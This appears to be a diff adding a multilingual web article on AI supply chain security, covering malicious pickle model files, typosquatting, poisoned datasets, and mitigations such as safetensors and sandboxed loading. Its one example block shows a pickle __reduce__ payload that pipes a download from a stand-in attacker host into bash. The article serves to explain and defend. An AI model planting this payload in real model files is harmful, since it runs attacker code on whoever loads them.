@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Supply Chain Security: Compromised Weights and Poisoned Repos — vsike</title>
+  <meta name="description" content="The AI development supply chain — model weights from HuggingFace, datasets from public repos, fine-tuning scripts from GitHub — is as attackable as any software dependency chain. Malicious weights, poisoned datasets, and typosquatted model names create attack vectors that bypass every layer of application-level security.">
+  <meta name="keywords" content="AI供应链安全, 模型权重投毒, HuggingFace安全, AI开发供应链攻击, 恶意模型文件, AI supply chain security, model weight poisoning, HuggingFace attacks, ML supply chain, pickle deserialization exploit">
+  <meta name="robots" content="index, follow">
+  <meta name="renderer" content="webkit">
+  <link rel="canonical" href="https://www.vsike.com/ideas/ai-supply-chain.html">
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    .attack-block { border-left: 3px solid #c0392b; padding: 1rem 1.5rem; margin: 2rem 0; background: rgba(192,57,43,0.05); }
+    .defend-block { border-left: 3px solid var(--accent); padding: 1rem 1.5rem; margin: 2rem 0; }
+    .pub-time { font-size: 0.78rem; color: var(--fg-dim); margin-bottom: 3rem; letter-spacing: 0.05em; }
+    .pull-quote { font-family: 'Georgia', serif; font-size: clamp(1.05rem, 2.5vw, 1.3rem); line-height: 1.55; border-left: 2px solid var(--accent); padding-left: 1.5rem; margin: 2.5rem 0; }
+    .vector-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 2rem 0; }
+    @media (max-width: 640px) { .vector-grid { grid-template-columns: 1fr; } }
+    .vector-card { border: 1px solid var(--fg-dim); padding: 1.2rem; }
+    .vector-card h4 { font-size: 0.78rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-alt, #0a0a0a); border: 1px solid var(--fg-dim); padding: 1.2rem 1.5rem; margin: 1.5rem 0; font-family: monospace; font-size: 0.82rem; line-height: 1.6; overflow-x: auto; white-space: pre; }
+  </style>
+</head>
+<body>
+<div class="page-transition" aria-hidden="true"></div>
+<nav class="nav" aria-label="Main navigation">
+  <div class="nav-bg" aria-hidden="true"></div>
+  <a href="../index.html" class="nav-logo" aria-label="vsike home">vsike<span class="nav-logo-dot" aria-hidden="true"></span></a>
+  <ul class="nav-links" role="list">
+    <li><a href="../about.html" data-i18n="nav.about">About</a></li>
+    <li><a href="../work.html" data-i18n="nav.work">Work</a></li>
+    <li><a href="../ideas.html" data-i18n="nav.ideas">Ideas</a></li>
+    <li><a href="../contact.html" data-i18n="nav.contact">Contact</a></li>
+  </ul>
+  <div class="lang-switcher" role="group" aria-label="Language selector">
+    <button class="lang-btn" data-lang="en" aria-pressed="true">EN</button>
+    <button class="lang-btn" data-lang="zh" aria-pressed="false">中</button>
+    <button class="lang-btn" data-lang="ja" aria-pressed="false">日</button>
+  </div>
+  <button class="nav-toggle" aria-label="Open menu" aria-expanded="false"><span></span><span></span><span></span></button>
+</nav>
+<div class="nav-mobile" role="dialog" aria-label="Mobile navigation">
+  <a href="../about.html" data-i18n="nav.about">About</a>
+  <a href="../work.html" data-i18n="nav.work">Work</a>
+  <a href="../ideas.html" data-i18n="nav.ideas">Ideas</a>
+  <a href="../contact.html" data-i18n="nav.contact">Contact</a>
+  <div class="lang-switcher-mobile" role="group">
+    <button class="lang-btn" data-lang="en">EN</button>
+    <button class="lang-btn" data-lang="zh">中文</button>
+    <button class="lang-btn" data-lang="ja">日本語</button>
+  </div>
+</div>
+<main>
+  <div class="container">
+    <article class="article-body">
+      <div class="article-header reveal">
+        <p class="label label-accent" data-i18n="asc.category">AI Security</p>
+        <h1 class="article-title reveal reveal-d1" data-i18n-html="asc.title">AI Supply Chain Security:<br>Compromised Weights and Poisoned Repos</h1>
+        <p class="pub-time">Published: 2026-05-17 22:59 PDT (Oregon)</p>
+        <p class="article-lead reveal reveal-d2" data-i18n="asc.lead">The AI development supply chain — model weights from HuggingFace, datasets from public repos, fine-tuning scripts from GitHub — is as attackable as any software dependency chain. Malicious weights, poisoned datasets, and typosquatted model names create attack vectors that bypass every layer of application-level security, executing code the moment a model is loaded.</p>
+      </div>
+
+      <div class="reveal">
+        <h2 data-i18n="asc.s1.title">The Pickle Problem</h2>
+        <p data-i18n="asc.s1.p1">The most acute AI supply chain vulnerability is the file format. PyTorch model weights have historically been distributed as pickle files. Pickle deserialization executes arbitrary Python code — loading a malicious .pkl or .pt file runs attacker-controlled code in the loading process, with full access to the host system. This is not a theoretical risk: researchers have demonstrated working exploits that execute on model load, and malicious models have been found on HuggingFace.</p>
+        <p data-i18n="asc.s1.p2">The ML ecosystem has recognized this problem. HuggingFace launched a malware scanner for uploaded models and recommends the safer safetensors format, which stores only tensor data and executes no code on load. But millions of models in the existing ecosystem still use pickle formats, and developers who download older models are exposed.</p>
+        <div class="pull-quote" data-i18n="asc.pull">Loading a model from an untrusted source is the equivalent of running an executable downloaded from a stranger. The model file is not data — it's code.</div>
+      </div>
+
+      <div class="reveal">
+        <h2 data-i18n="asc.s2.title">Attack Vectors in the AI Supply Chain</h2>
+        <div class="vector-grid">
+          <div class="vector-card">
+            <h4 data-i18n="asc.v1.label">Typosquatted model names</h4>
+            <p data-i18n="asc.v1.p">Popular models like "meta-llama/Llama-2-7b" are targets for typosquatted clones — "meta-11ama/Llama-2-7b" or "meta-llama/Lama-2-7b" — containing malicious pickle payloads. An automated training pipeline that downloads model names from config files is especially vulnerable.</p>
+          </div>
+          <div class="vector-card">
+            <h4 data-i18n="asc.v2.label">Compromised legitimate accounts</h4>
+            <p data-i18n="asc.v2.p">A legitimate, popular model repo account gets compromised through credential theft. The attacker updates the model weights with a malicious version while preserving the model's functional behavior — the model works normally but executes malicious code on load in every environment that downloads the update.</p>
+          </div>
+          <div class="vector-card">
+            <h4 data-i18n="asc.v3.label">Poisoned training datasets</h4>
+            <p data-i18n="asc.v3.p">Public datasets hosted on HuggingFace Datasets, GitHub, or direct URLs can be poisoned with adversarial examples, backdoor triggers, or CSAM. Any training pipeline that downloads public datasets without verification is vulnerable to data-level poisoning that produces compromised models.</p>
+          </div>
+          <div class="vector-card">
+            <h4 data-i18n="asc.v4.label">Malicious fine-tuning code</h4>
+            <p data-i18n="asc.v4.p">Training scripts and fine-tuning notebooks shared on GitHub or Kaggle may contain obfuscated code that exfiltrates model weights, training data, or credentials during training. Code review for ML pipelines is often less rigorous than for production software — a gap attackers exploit.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="reveal">
+        <h2 data-i18n="asc.s3.title">The Scale of Exposure</h2>
+        <p data-i18n="asc.s3.p1">HuggingFace hosts over 500,000 model repositories and 100,000 dataset repositories. Researchers at JFrog and others have found hundreds of models with malicious payloads including reverse shells, credential stealers, and cryptocurrency miners. The download counts on many flagged models were in the thousands before detection — meaning the attack surface is not theoretical, it's active.</p>
+        <div class="attack-block">
+          <strong data-i18n="asc.s3.attack">Example payload pattern:</strong>
+          <div class="code-block">import os, socket, subprocess
+# Embedded in __reduce__ method of serialized object
+def __reduce__(self):
+    cmd = 'curl http://attacker.com/payload | bash'
+    return (os.system, (cmd,))</div>
+          <p data-i18n="asc.s3.attack.p">This code runs automatically when <code>torch.load()</code> or <code>pickle.load()</code> processes the file — before any application code has a chance to inspect the model. The payload executes with the permissions of the Python process loading the model.</p>
+        </div>
+      </div>
+
+      <div class="reveal">
+        <h2 data-i18n="asc.s4.title">Mitigations</h2>
+        <div class="defend-block">
+          <ul>
+            <li data-i18n="asc.s4.l1"><strong>Use safetensors format exclusively for model weights.</strong> Safetensors stores only tensor data and has no code execution on load. When downloading existing models, use <code>from_pretrained(..., use_safetensors=True)</code>. Reject loading of .pkl and .pt files from untrusted sources.</li>
+            <li data-i18n="asc.s4.l2"><strong>Pin model versions and verify checksums.</strong> Never download model weights with a floating reference like "latest." Pin to a specific commit hash and verify SHA256 checksums against a separately stored manifest. Any change in the model file should be an explicit human decision.</li>
+            <li data-i18n="asc.s4.l3"><strong>Load models in isolated sandboxes.</strong> Model loading should happen in a subprocess with no network access, no filesystem write access to production directories, and a restricted seccomp profile. Any malicious payload that executes on load is contained to the sandbox.</li>
+            <li data-i18n="asc.s4.l4"><strong>Run HuggingFace's malware scanner and Picklescan before using downloaded models.</strong> Picklescan is an open-source tool that inspects pickle files for dangerous opcodes before they're executed. Not foolproof against sophisticated obfuscation, but catches common attack patterns.</li>
+            <li data-i18n="asc.s4.l5"><strong>Maintain an internal model registry with approved, verified models.</strong> Production systems should pull from an internal registry, not directly from HuggingFace or GitHub. The registry is the point where security verification happens — provenance checks, malware scanning, and approval workflows — before a model reaches production.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="article-footer reveal">
+        <a href="../ideas.html" class="btn-ghost btn" data-i18n="article.back">← All ideas</a>
+      </div>
+    </article>
+  </div>
+</main>
+<footer class="footer"><div class="container"><div class="footer-inner">
+  <a href="../index.html" class="footer-logo">vsike<span class="nav-logo-dot"></span></a>
+  <nav class="footer-links" aria-label="Footer navigation">
+    <a href="../about.html" data-i18n="nav.about">About</a>
+    <a href="../work.html" data-i18n="nav.work">Work</a>
+    <a href="../ideas.html" data-i18n="nav.ideas">Ideas</a>
+    <a href="../contact.html" data-i18n="nav.contact">Contact</a>
+  </nav>
+</div></div></footer>
+<script>
+window.ARTICLE_TRANS = {
+  en: {
+    'asc.category': 'AI Security',
+    'asc.title': 'AI Supply Chain Security:<br>Compromised Weights and Poisoned Repos',
+    'asc.lead': 'The AI development supply chain — model weights from HuggingFace, datasets from public repos, fine-tuning scripts from GitHub — is as attackable as any software dependency chain. Malicious weights, poisoned datasets, and typosquatted model names execute code the moment a model is loaded.',
+    'asc.s1.title': 'The Pickle Problem',
+    'asc.s1.p1': 'The most acute AI supply chain vulnerability is the file format. PyTorch weights have historically used pickle files. Pickle deserialization executes arbitrary Python code — loading a malicious .pkl file runs attacker code with full system access. Researchers have found working exploits on HuggingFace.',
+    'asc.s1.p2': 'HuggingFace launched malware scanning and recommends safetensors format, which stores only tensor data and executes no code on load. But millions of models still use pickle, exposing developers who download older models.',
+    'asc.pull': 'Loading a model from an untrusted source is the equivalent of running an executable downloaded from a stranger. The model file is not data — it\'s code.',
+    'asc.s2.title': 'Attack Vectors in the AI Supply Chain',
+    'asc.v1.label': 'Typosquatted model names', 'asc.v1.p': 'Popular models are targets for typosquatted clones with malicious pickle payloads. An automated pipeline downloading model names from config files is especially vulnerable.',
+    'asc.v2.label': 'Compromised legitimate accounts', 'asc.v2.p': 'A popular model repo account is compromised, updating weights with a malicious version while preserving functional behavior. Every environment downloading the update gets the payload.',
+    'asc.v3.label': 'Poisoned training datasets', 'asc.v3.p': 'Public datasets can be poisoned with adversarial examples or backdoor triggers. Any training pipeline downloading public datasets without verification produces compromised models.',
+    'asc.v4.label': 'Malicious fine-tuning code', 'asc.v4.p': 'Training scripts on GitHub or Kaggle may contain obfuscated code that exfiltrates model weights or credentials during training. ML pipeline code review is often less rigorous than production software review.',
+    'asc.s3.title': 'The Scale of Exposure',
+    'asc.s3.p1': 'HuggingFace hosts over 500,000 model repos. JFrog and others have found hundreds of models with malicious payloads including reverse shells, credential stealers, and miners. Download counts on flagged models were in the thousands before detection.',
+    'asc.s3.attack': 'Example payload pattern:', 'asc.s3.attack.p': 'This code runs automatically when torch.load() processes the file — before any application code inspects the model. The payload executes with the permissions of the Python process loading the model.',
+    'asc.s4.title': 'Mitigations',
+    'asc.s4.l1': '<strong>Use safetensors format exclusively.</strong> Safetensors has no code execution on load. Use <code>from_pretrained(..., use_safetensors=True)</code>. Reject .pkl and .pt files from untrusted sources.',
+    'asc.s4.l2': '<strong>Pin model versions and verify checksums.</strong> Never use floating references like "latest." Pin to a specific commit hash and verify SHA256 against a separately stored manifest.',
+    'asc.s4.l3': '<strong>Load models in isolated sandboxes.</strong> Model loading should happen in a subprocess with no network access, no write access to production directories, and a restricted seccomp profile.',
+    'asc.s4.l4': '<strong>Run malware scanners before using downloaded models.</strong> Picklescan inspects pickle files for dangerous opcodes before execution. Not foolproof but catches common attack patterns.',
+    'asc.s4.l5': '<strong>Maintain an internal model registry.</strong> Production systems pull from an internal registry, not directly from HuggingFace. The registry is where provenance checks, malware scanning, and approval workflows happen.',
+    'article.back': '← All ideas',
+  },
+  zh: {
+    'asc.category': 'AI 安全',
+    'asc.title': 'AI 供应链安全：<br>被入侵的模型权重与被污染的仓库',
+    'asc.lead': 'AI 开发供应链——来自 HuggingFace 的模型权重、来自公开仓库的数据集、来自 GitHub 的微调脚本——与任何软件依赖链一样容易被攻击。恶意权重、被污染的数据集和模型名称仿冒在模型加载的瞬间执行代码，绕过应用层的每一道安全防线。',
+    'asc.s1.title': 'Pickle 问题',
+    'asc.s1.p1': '最急迫的 AI 供应链漏洞是文件格式。PyTorch 模型权重历来以 pickle 文件分发。Pickle 反序列化执行任意 Python 代码——加载恶意的 .pkl 或 .pt 文件会以完整的主机系统访问权运行攻击者控制的代码。研究人员已在 HuggingFace 上发现可工作的漏洞利用程序，并发现了恶意模型。',
+    'asc.s1.p2': 'HuggingFace 推出了上传模型的恶意软件扫描，并推荐更安全的 safetensors 格式，该格式只存储张量数据，加载时不执行任何代码。但现有生态系统中仍有数百万个模型使用 pickle 格式，下载旧模型的开发者面临风险。',
+    'asc.pull': '从不受信来源加载模型，等同于运行从陌生人处下载的可执行文件。模型文件不是数据——它是代码。',
+    'asc.s2.title': 'AI 供应链中的攻击向量',
+    'asc.v1.label': '仿冒模型名称', 'asc.v1.p': 'meta-llama/Llama-2-7b 等热门模型是仿冒克隆的目标——"meta-11ama/Llama-2-7b"或"meta-llama/Lama-2-7b"——包含恶意 pickle 载荷。从配置文件下载模型名称的自动训练流程尤其容易受到攻击。',
+    'asc.v2.label': '合法账户被入侵', 'asc.v2.p': '通过凭证盗窃入侵热门模型仓库账户。攻击者更新恶意版本的模型权重，同时保留模型的功能行为——下载该更新的每个环境都会收到载荷。',
+    'asc.v3.label': '被污染的训练数据集', 'asc.v3.p': '托管在 HuggingFace 数据集、GitHub 或直接 URL 上的公开数据集可被注入对抗样本或后门触发器。任何未经验证就下载公开数据集的训练流程都可能产生被攻陷的模型。',
+    'asc.v4.label': '恶意微调代码', 'asc.v4.p': 'GitHub 或 Kaggle 上共享的训练脚本和微调笔记本可能包含在训练期间泄露模型权重、训练数据或凭证的混淆代码。ML 流程的代码审查通常不如生产软件严格——攻击者利用了这一缺口。',
+    'asc.s3.title': '暴露规模',
+    'asc.s3.p1': 'HuggingFace 托管超过 50 万个模型仓库。JFrog 等研究人员发现了数百个含有恶意载荷的模型，包括反向 Shell、凭证窃取器和加密货币挖矿程序。被标记模型在检测前的下载量已达数千次——攻击面不是理论上的，而是现实活跃的。',
+    'asc.s3.attack': '示例载荷模式：', 'asc.s3.attack.p': '当 <code>torch.load()</code> 处理文件时，此代码会自动运行——在任何应用代码有机会检查模型之前。载荷以加载模型的 Python 进程的权限执行。',
+    'asc.s4.title': '缓解措施',
+    'asc.s4.l1': '<strong>专门使用 safetensors 格式存储模型权重。</strong>Safetensors 在加载时不执行代码。使用 <code>from_pretrained(..., use_safetensors=True)</code>。拒绝从不受信来源加载 .pkl 和 .pt 文件。',
+    'asc.s4.l2': '<strong>固定模型版本并验证校验和。</strong>永远不要使用"latest"等浮动引用。固定到特定的提交哈希，并对照单独存储的清单验证 SHA256 校验和。',
+    'asc.s4.l3': '<strong>在隔离沙箱中加载模型。</strong>模型加载应在没有网络访问、没有对生产目录写入权限且受限 seccomp 配置文件的子进程中进行。',
+    'asc.s4.l4": "<strong>在使用下载的模型前运行恶意软件扫描器。</strong>Picklescan 在执行前检查 pickle 文件中的危险操作码。对复杂混淆并非万无一失，但能捕获常见攻击模式。',
+    'asc.s4.l5': '<strong>维护内部模型注册表，存放经过审批和验证的模型。</strong>生产系统应从内部注册表拉取，而非直接从 HuggingFace 或 GitHub 拉取。注册表是进行来源检查、恶意软件扫描和审批工作流的节点。',
+    'article.back': '← 返回所有文章',
+  },
+  ja: {
+    'asc.category': 'AIセキュリティ',
+    'asc.title': 'AI供給チェーンセキュリティ：<br>侵害された重みと汚染されたリポジトリ',
+    'asc.lead': 'AI開発の供給チェーン——HuggingFaceのモデル重み、パブリックリポジトリのデータセット、GitHubのファインチューニングスクリプト——はどんなソフトウェア依存関係チェーンと同様に攻撃可能だ。悪意のある重み、汚染されたデータセット、タイポスクワットされたモデル名がモデルロードの瞬間にコードを実行し、アプリケーションレベルのセキュリティをすべてバイパスする。',
+    'asc.s1.title': 'Pickleの問題',
+    'asc.s1.p1': 'AI供給チェーンで最も深刻な脆弱性はファイル形式だ。PyTorchモデルの重みは歴史的にpickleファイルとして配布されてきた。Pickleのデシリアライズは任意のPythonコードを実行する——悪意のある.pklファイルを読み込むと、完全なシステムアクセスで攻撃者のコードが実行される。',
+    'asc.s1.p2': 'HuggingFaceはアップロードモデルのマルウェアスキャンを開始し、よりサーフなsafetensors形式を推奨している。これはテンソルデータのみを格納し、ロード時にコードを実行しない。しかし既存のエコシステムには数百万のpickle形式のモデルがあり、古いモデルをダウンロードする開発者は危険にさらされている。',
+    'asc.pull': '信頼できないソースからモデルを読み込むことは、見知らぬ人からダウンロードした実行ファイルを実行するのと同等だ。モデルファイルはデータではない——コードだ。',
+    'asc.s2.title': 'AI供給チェーンの攻撃ベクター',
+    'asc.v1.label': 'タイポスクワットされたモデル名', 'asc.v1.p': '人気モデルは悪意のあるpickleペイロードを含むタイポスクワットクローンの標的だ。設定ファイルからモデル名をダウンロードする自動パイプラインは特に脆弱だ。',
+    'asc.v2.label': '正規アカウントの侵害', 'asc.v2.p': '人気モデルリポジトリのアカウントが認証情報の盗難で侵害される。攻撃者はモデルの機能動作を保持しながら重みを悪意あるバージョンに更新——アップデートをダウンロードすべての環境がペイロードを受け取る。',
+    'asc.v3.label': '汚染されたトレーニングデータセット', 'asc.v3.p': 'HuggingFace Datasets、GitHub、直接URLでホストされるパブリックデータセットは対抗的サンプルやバックドアトリガーで汚染される可能性がある。検証せずにパブリックデータセットをダウンロードするトレーニングパイプラインは侵害されたモデルを生成する。',
+    'asc.v4.label': '悪意のあるファインチューニングコード', 'asc.v4.p': 'GitHubやKaggleで共有されるトレーニングスクリプトや notebooks には、トレーニング中にモデル重みや認証情報を漏洩する難読化コードが含まれている可能性がある。MLパイプラインのコードレビューは本番ソフトウェアより厳格でないことが多い。',
+    'asc.s3.title': '暴露の規模',
+    'asc.s3.p1': 'HuggingFaceは50万以上のモデルリポジトリをホストしている。JFrogらはリバースシェル、認証情報スティーラー、クリプトマイナーを含む悪意のあるペイロードを持つ数百のモデルを発見した。フラグを立てられたモデルの検出前のダウンロード数は数千に達していた。',
+    'asc.s3.attack': 'ペイロードパターン例：', 'asc.s3.attack.p': 'このコードはtorch.load()がファイルを処理するとき自動的に実行される——アプリケーションコードがモデルを検査する前に。ペイロードはモデルを読み込むPythonプロセスの権限で実行される。',
+    'asc.s4.title': '緩和策',
+    'asc.s4.l1': '<strong>モデル重みにsafetensors形式のみを使用する。</strong>Safetensorsはロード時にコードを実行しない。<code>from_pretrained(..., use_safetensors=True)</code>を使用する。信頼できないソースからの.pklと.ptファイルの読み込みを拒否する。',
+    'asc.s4.l2': '<strong>モデルバージョンをピン止めしてチェックサムを検証する。</strong>「latest」のようなフローティング参照を使わない。特定のコミットハッシュにピン止めし、別途保存したマニフェストに対してSHA256を検証する。',
+    'asc.s4.l3': '<strong>モデルを分離されたサンドボックスで読み込む。</strong>モデルの読み込みはネットワークアクセスなし、本番ディレクトリへの書き込みアクセスなし、制限されたseccompプロファイルでサブプロセスで行うべきだ。',
+    'asc.s4.l4': '<strong>ダウンロードしたモデルを使う前にマルウェアスキャナーを実行する。</strong>Picklescanは実行前にpickleファイルの危険なオペコードを検査する。高度な難読化には完璧ではないが、一般的な攻撃パターンを捕捉する。',
+    'asc.s4.l5': '<strong>承認・検証済みモデルの内部モデルレジストリを維持する。</strong>本番システムはHuggingFaceやGitHubから直接ではなく内部レジストリから取得する。レジストリが来歴チェック、マルウェアスキャン、承認ワークフローが行われる場所だ。',
+    'article.back': '← アイデア一覧へ',
+  },
+};
+</script>
+<script src="../js/main.js"></script>
+</body>
+</html>
